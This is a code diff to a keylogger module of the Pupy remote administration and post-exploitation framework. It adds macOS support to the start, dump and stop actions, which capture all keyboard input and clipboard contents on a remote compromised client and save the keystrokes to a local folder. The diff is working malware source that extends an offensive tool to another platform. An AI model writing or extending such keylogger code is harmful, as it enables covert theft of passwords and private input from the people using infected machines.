@@ -14,7 +14,7 @@ from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="KeyloggerModule"
 
-@config(cat="gather", compat=["linux", "windows"])
+@config(cat="gather", compat=["linux", "darwin", "windows"])
 class KeyloggerModule(PupyModule):
     """ 
         A keylogger to monitor all keyboards interaction including the clipboard :-)
@@ -43,8 +43,8 @@ class KeyloggerModule(PupyModule):
                         self.error("the keylogger is already started")
                     else:
                         self.success("keylogger started !")
-            # not tested on android
-            else:
+            
+            elif self.client.is_linux():
                 with redirected_stdio(self.client.conn): #to see the output exception in case of error
                     r = self.client.conn.modules["keylogger"].keylogger_start()
                     if r == 'no_x11':
@@ -54,6 +54,16 @@ class KeyloggerModule(PupyModule):
                     else:
                         self.success("keylogger started !")
 
+            # for Mac OS
+            elif self.client.is_darwin():
+                r = self.client.conn.modules["keylogger"].keylogger_start()
+                if r == 'running':
+                    self.error("the keylogger is already started")
+                elif not r:
+                    self.error("the keylogger cannot be launched")
+                else:
+                    self.success("keylogger started !")
+
         elif args.action=="dump":
             try:
                 os.makedirs(os.path.join("data","keystrokes"))
@@ -62,8 +72,10 @@ class KeyloggerModule(PupyModule):
             
             if self.client.is_windows():
                 data=self.client.conn.modules["pupwinutils.keylogger"].keylogger_dump()
-            else:
+            elif self.client.is_linux():
                  data=self.client.conn.modules["keylogger"].keylogger_dump()
+            elif self.client.is_darwin():
+                data=self.client.conn.modules["keylogger"].keylogger_dump()
 
             if data is None:
                 self.error("keylogger not started")
@@ -79,7 +91,9 @@ class KeyloggerModule(PupyModule):
         elif args.action=="stop":
             if self.client.is_windows():
                 stop = self.client.conn.modules["pupwinutils.keylogger"].keylogger_stop()
-            else:
+            elif self.client.is_linux():
+                stop = self.client.conn.modules["keylogger"].keylogger_stop()
+            elif self.client.is_darwin():
                 stop = self.client.conn.modules["keylogger"].keylogger_stop()
 
             if stop:
